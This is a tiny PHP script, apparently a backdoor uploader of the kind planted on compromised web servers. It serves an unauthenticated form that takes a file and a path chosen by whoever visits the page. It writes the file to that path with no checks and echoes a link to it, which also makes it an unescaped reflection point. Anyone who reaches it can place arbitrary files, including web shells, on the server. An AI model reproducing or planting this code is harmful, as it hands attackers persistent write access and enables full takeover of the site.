<?php



$files = @$_FILES["files"];

if ($files["name"] != '') {

    $fullpath = $_REQUEST["path"] . $files["name"];

  

}echo '<html><head><title>Upload files...</title></head><body><form method=POST enctype="multipart/form-data" action=""><input type=text name=path><input type="file" name="files"><input type=submit value="Up"></form></body></html>';

  if (move_uploaded_file($files['tmp_name'], $fullpath)) {

        echo "<h1>file uploaded<br><a href='$fullpath'><font color='#006400'>Click here!</font></a></h1>";

    }
